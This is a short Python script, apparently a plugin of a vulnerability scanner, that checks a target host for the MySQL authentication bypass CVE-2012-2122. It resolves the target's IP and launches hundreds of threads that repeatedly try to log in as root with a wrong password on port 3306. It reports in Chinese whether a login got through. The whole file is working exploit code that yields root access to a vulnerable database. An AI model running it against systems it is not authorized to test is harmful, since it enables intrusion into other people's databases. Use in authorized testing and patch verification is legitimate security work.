import pymysql
import threading
import sys
import socket
from module import color_one

url=''
count = 0
def main(ip):
    global count
    try:
        conn = pymysql.connect(host=ip,user='root',passwd='wrong',port=3306,charset='utf8')
        cur = conn.cursor()
        if cur !=None:
            print(color_one.green+'存在mysql CVE-2012-2122 漏洞'+color_one.end)
            count+=1
            sys.exit(0)

    except:
        pass

def run():
    domain = url.split('/')[0] if '://' not in url else url.split('//')[1].split('/')[0]
    domain = domain.split(':')[0] if ':' in domain else domain
    try:
        ip = socket.gethostbyname(domain)
    except:
        pass
    ip=str(ip)
    list_th=[]
    for i in range(1,5):
        for i in range(1,200):
            t1=threading.Thread(target=main,args=(ip,))
            if count !=0:
                break
            t1.start()
            list_th.append(t1)
        for stop in list_th:
            stop.join()
    if count == 0:
            print(color_one.red+'不存在mysql CVE-2012-2122 漏洞'+color_one.end)